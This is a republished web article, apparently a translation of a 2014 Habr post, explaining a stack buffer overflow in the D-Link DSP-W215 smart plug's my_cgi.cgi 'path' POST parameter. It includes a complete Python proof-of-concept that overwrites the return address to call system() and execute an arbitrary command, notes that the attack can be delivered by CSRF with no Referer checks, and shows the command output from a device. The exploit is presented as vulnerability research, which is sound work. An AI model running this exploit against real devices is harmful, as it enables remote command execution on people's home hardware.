<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Hacking the D-Link DSP-W215 Smart Plug: Again, Again, Again</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In the previous series: 


1. Hacking the D-Link DSP-W215 Smart Plug 
2. Hacking the D-Link DSP-W215 Smart Plug. Again 
3. Hacking the D-Link DSP-W215...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Hacking the D-Link DSP-W215 Smart Plug: Again, Again, Again</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/cfa/cdc/25a/cfacdc25a3e2ca6d68b7680d5e78225e.png" alt="image"><br><br>  <b>In the previous series:</b> <br><ol><li>  <a href="http://habrahabr.ru/post/223313/">Hacking the D-Link DSP-W215 Smart Plug</a> </li><li>  <a href="http://habrahabr.ru/post/223973/">Hacking the D-Link DSP-W215 Smart Plug.</a>  <a href="http://habrahabr.ru/post/223973/">Again</a> </li><li>  <a href="http://habrahabr.ru/post/223991/">Hacking the D-Link DSP-W215 Smart Plug.</a>  <a href="http://habrahabr.ru/post/223991/">Again and again</a> </li></ol><br><br>  Until now, all the vulnerabilities found in DSP-W215 could only be performed from the LAN, well, if you are not stupid and have not opened access to the Smart Plug from the Internet. <br>  A typical way to attack devices with an embedded web server, accessible only from the internal network, such as the fact that the DSP-W215 - through the CSRF.  The problem with this method is that any web browser will encode (urlencode) the transmitted data, for example, the return address, but until this point we used vulnerabilities that do not decode our data (urldecode) (the vulnerability in the replace_special_char function that we exploited in previous article, decodes only a limited set of ASCII characters). 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The binary file my_cgi.cgi, which is the main vulnerable target, contains the decode function decoder, which decodes the POST data.  This function is passed two arguments: a pointer to the encoded data and a pointer to the buffer where the decoded data is stored: <br><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decode</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *encode_buf, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *decode_buf</span></span></span><span class="hljs-function">)</span></span>;</code> </pre> <br><br>  This function simply loops through all the bytes in encode_buf and decodes or copies them into decode_buf: <br><img src="https://habrastorage.org/getpro/habr/post_images/c56/407/8d6/c564078d6f9d95f57e9e7851d66fc711.png" alt="image"><a name="habracut"></a><br><br>  Roughly speaking, its code looks something like this: <br><pre> <code class="hljs pgsql"><span class="hljs-type"><span class="hljs-type">void</span></span> decode(<span class="hljs-type"><span class="hljs-type">char</span></span> *encode_buf, <span class="hljs-type"><span class="hljs-type">char</span></span> *decode_buf) { <span class="hljs-type"><span class="hljs-type">int</span></span> encoded_byte_len; <span class="hljs-type"><span class="hljs-type">char</span></span> *encode_buf_end_ptr = encode_buf + strlen(encode_buf); // <span class="hljs-keyword"><span class="hljs-keyword">Loop</span></span> through <span class="hljs-keyword"><span class="hljs-keyword">all</span></span> bytes <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> encode_buf, <span class="hljs-keyword"><span class="hljs-keyword">without</span></span> knowing how big decode_buf <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(encoded_data &lt; encode_buf_end_ptr) { <span class="hljs-comment"><span class="hljs-comment">/* * ... * Do Decoding of the next byte in encoded_data. * encoded_byte_len = number of bytes processed in this loop iteration (1 or 3). * ... */</span></span> decode_buf[<span class="hljs-number"><span class="hljs-number">0</span></span>] = decoded_byte; decode_buf++; encoded_data += encoded_byte_len; } }</code> </pre> <br><br>  If the calling function did not take care of allocating a buffer of sufficient size to save all decoded data, then this buffer (decode_buf) may be filled with a large POST parameter. <br>  In my_cgi.cgi there is only one function from which the decoding function is called - get_input_entries: <br><img src="http://www.devttys0.com/wp-content/uploads/2014/05/strcmp_path.png" alt="image"><br><br>  As you can see, the ‚Äúdecode‚Äù function is called only if the name of the POST parameter is ‚Äúpath‚Äù, and from memset you can see that the decode_buf buffer is allocated only 0 √ó 400 on the stack: <br><pre> <code class="hljs pgsql"><span class="hljs-type"><span class="hljs-type">char</span></span> decode_buf[<span class="hljs-number"><span class="hljs-number">0x400</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strcmp(entries[i]-&gt;<span class="hljs-type"><span class="hljs-type">name</span></span>, "path") == <span class="hljs-number"><span class="hljs-number">0</span></span>) { // Decode <span class="hljs-type"><span class="hljs-type">path</span></span> POST <span class="hljs-keyword"><span class="hljs-keyword">value</span></span> <span class="hljs-keyword"><span class="hljs-keyword">into</span></span> the fixed-size decode_buf decode(entries[i]-&gt;<span class="hljs-keyword"><span class="hljs-keyword">value</span></span>, decode_buf); strcpy(entries[i]-&gt;<span class="hljs-keyword"><span class="hljs-keyword">value</span></span>, decode_buf); } replace_special_char(entries[i]-&gt;<span class="hljs-keyword"><span class="hljs-keyword">value</span></span>);</code> </pre> <br><br>  This means that if we pass the value of ‚Äúpath‚Äù in a POST request larger than 0 √ó 400 bytes, the decode_buf buffer on the stack inside the get_input_entries function will overflow.  And, more interestingly, we will not have ‚Äúbad‚Äù bytes, because  the decode function decodes them all (for example, turns% 00 into NULL bytes) before copying back to the stack. <br><br>  However, we need to take some caution when designing the exploit so as not to cause a buffer overflow in the replace_special_char function, which is called before returning from get_input_entries. <br><br>  Fortunately, the data that is transferred to replace_special_char first passes strcpy from decode_buf, so if we put a NULL byte somewhere closer to the beginning of the POST request, a very small string is passed to the replace_special_char function (everything that was before the first NULL bytes) instead of the entire POST request that was decoded onto the stack. <br><br>  The ‚Äúpath‚Äù POST value, which is longer than 1060 bytes, overflows everything in the get_input_entries function's stack frame, including the return address: <br><img src="http://www.devttys0.com/wp-content/uploads/2014/05/get_input_entries_stack.png" alt="image"><br><br>  And because we have no bad bytes, we can use the return address 0x00405CEC, which we used in previous exploits, to call system () with a pointer to the stack ($ sp + 0 √ó 28): <br><img src="http://www.devttys0.com/wp-content/uploads/2014/05/return_to_system.png" alt="image"><br><br>  Here is a small Python PoC code that overflows the get_input_entries function, replaces the return address with the system () call at 0x00405CEC and runs a command on the stack at the $ sp + 0 √ó 28 offset: <br><pre> <code class="hljs vbscript">import sys import urllib import urllib2 try: target = sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>] command = sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>] except: print <span class="hljs-string"><span class="hljs-string">"Usage: %s &lt;target&gt; &lt;command&gt;"</span></span> % sys.argv[<span class="hljs-number"><span class="hljs-number">0</span></span>] sys.<span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>) url = <span class="hljs-string"><span class="hljs-string">"http://%s/common/info.cgi"</span></span> % target buf = <span class="hljs-string"><span class="hljs-string">"\x00"</span></span> # Start <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> a <span class="hljs-literal"><span class="hljs-literal">NULL</span></span> byte <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> prevent crashing <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> replace_special_chars buf += <span class="hljs-string"><span class="hljs-string">"D"</span></span> * (<span class="hljs-number"><span class="hljs-number">1060</span></span><span class="hljs-number"><span class="hljs-number">-1</span></span>) # Stack filler buf += <span class="hljs-string"><span class="hljs-string">"\x00\x40\x5C\xEC"</span></span> # $ra, address of <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> system() buf += <span class="hljs-string"><span class="hljs-string">"E"</span></span> * <span class="hljs-number"><span class="hljs-number">0x28</span></span> # Stack filler buf += command # Command <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">execute</span></span> buf += <span class="hljs-string"><span class="hljs-string">"\x00"</span></span> # <span class="hljs-literal"><span class="hljs-literal">NULL</span></span> terminate the command, <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> good measure # URL encode the path POST value post_data = <span class="hljs-string"><span class="hljs-string">"path="</span></span> + urllib.quote_plus(buf).<span class="hljs-built_in"><span class="hljs-built_in">replace</span></span>(<span class="hljs-comment"><span class="hljs-comment">'+', '%20') # Set a referer to show that there are no CSRF protections headers = {'Referer' : 'http://www.attacker.com/exploit.html'} req = urllib2.Request(url, post_data, headers) print urllib2.urlopen(req).read()</span></span></code> </pre> <br><br>  It works, of course, as it should be: <br><pre> <code class="hljs pgsql">$ ./exploit.py <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.0</span></span><span class="hljs-number"><span class="hljs-number">.60</span></span> <span class="hljs-string"><span class="hljs-string">'ls -l /'</span></span> drwxr-xr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">01</span></span> bin drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">22</span></span> <span class="hljs-number"><span class="hljs-number">18</span></span>:<span class="hljs-number"><span class="hljs-number">03</span></span> dev drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Sep <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">2010</span></span> etc drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">01</span></span> lib drwxr-xr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">01</span></span> libexec lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">11</span></span> May <span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-number"><span class="hljs-number">15</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span> linuxrc -&gt; bin/busybox drwxrwxr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Nov <span class="hljs-number"><span class="hljs-number">11</span></span> <span class="hljs-number"><span class="hljs-number">2008</span></span> lost+<span class="hljs-built_in"><span class="hljs-built_in">found</span></span> drwxrwxr-x <span class="hljs-number"><span class="hljs-number">6</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-number"><span class="hljs-number">15</span></span>:<span class="hljs-number"><span class="hljs-number">15</span></span> mnt drwxr-xr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">01</span></span> mydlink drwxrwxr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Nov <span class="hljs-number"><span class="hljs-number">11</span></span> <span class="hljs-number"><span class="hljs-number">2008</span></span> proc drwxrwxr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-number"><span class="hljs-number">17</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> root drwxr-xr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">01</span></span> sbin drwxrwxrwx <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">24</span></span> <span class="hljs-number"><span class="hljs-number">23</span></span>:<span class="hljs-number"><span class="hljs-number">26</span></span> tmp drwxrwxr-x <span class="hljs-number"><span class="hljs-number">7</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">16</span></span> <span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">01</span></span> usr drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">17</span></span> <span class="hljs-number"><span class="hljs-number">15</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span> var -rw-r<span class="hljs-comment"><span class="hljs-comment">--r-- 1 1000 1000 17 May 16 09:01 version drwxrwxr-x 6 1000 1000 4096 May 22 17:15 www</span></span></code> </pre> </div><p>Source: <a href="https://habr.com/ru/post/224063/">https://habr.com/ru/post/224063/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../224045/index.html">NASA hands over control of the ISEE-3 satellite to the hands of space enthusiasts</a></li>
<li><a href="../224047/index.html">Ansible under Windows with crutches, props and integration with Vagrant</a></li>
<li><a href="../224053/index.html">Autodocumentation of mobile web services on the example of Yii</a></li>
<li><a href="../224055/index.html">Active noise reduction of the shutter sound in the camera of the mobile device</a></li>
<li><a href="../224057/index.html">Open Terminal Client OTC-110 - works with Citrix</a></li>
<li><a href="../224065/index.html">Python-digest # 28. News, interesting projects, articles and interviews [May 19, 2014 - May 25, 2014]</a></li>
<li><a href="../224067/index.html">Profishop - solution for receiving orders from wholesale customers</a></li>
<li><a href="../224069/index.html">Splitting algorithms and van der Waerden numbers</a></li>
<li><a href="../224071/index.html">Popularizing 3D printing in an adult way ... in schools</a></li>
<li><a href="../224073/index.html">Node.js: Overview of General Library Development Technologies</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>